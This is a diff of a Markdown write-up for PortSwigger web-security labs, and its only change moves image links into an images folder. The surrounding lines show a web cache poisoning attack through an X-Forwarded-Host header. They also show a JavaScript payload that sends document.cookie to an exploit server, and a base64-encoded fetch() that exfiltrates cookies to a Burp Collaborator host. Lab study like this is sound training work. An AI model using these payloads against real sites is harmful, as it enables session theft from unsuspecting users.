@@ -98,7 +98,7 @@ X-Forwarded-Host: exploit-SERVER.exploit-server.net
 
 ```  
 
-![tracking.js](tracking.js.png)  
+![tracking.js](images\tracking.js.png)  
 
 >Hosting the following **on exploit server, injecting the **X-Forwarded-Host** header in request, and poison the cache until victim hits poison cache.  
 
@@ -106,7 +106,7 @@ X-Forwarded-Host: exploit-SERVER.exploit-server.net
  /resources/js/tracking.js 
 ```  
   
-![exploit host tracking.js](exploit-host-tracking-js.png)  
+![exploit host tracking.js](images\exploit-host-tracking-js.png)  
   
 ```javascript
 document.location='https://exploit.exploit-server.net/cookies?c='+document.cookie;
@@ -114,7 +114,7 @@ document.location='https://exploit.exploit-server.net/cookies?c='+document.cooki
 
 >Keep **Poisoning** the web cache of target by resending request with **X-Forwarded-Host** header.  
 
-![x-cache-hit.png](x-cache-hit.png)  
+![x-cache-hit.png](images\x-cache-hit.png)  
 
 [PortSwigger Lab: Web cache poisoning with an unkeyed header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)  
 
@@ -202,7 +202,7 @@ ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20v
   
 >The image below shows Burp Collaborator receiving the victim cookie as a base64 result.  
 
-![Burp collaborator receiving request with base64 cookie value from our POC.](xss2.png)  
+![Burp collaborator receiving request with base64 cookie value from our POC.](images\xss2.png)  
 
 >Hosting the **IFRAME** with eval() and fetch() payload on exploit server, respectively base64 encoded and URL encoded.  
 
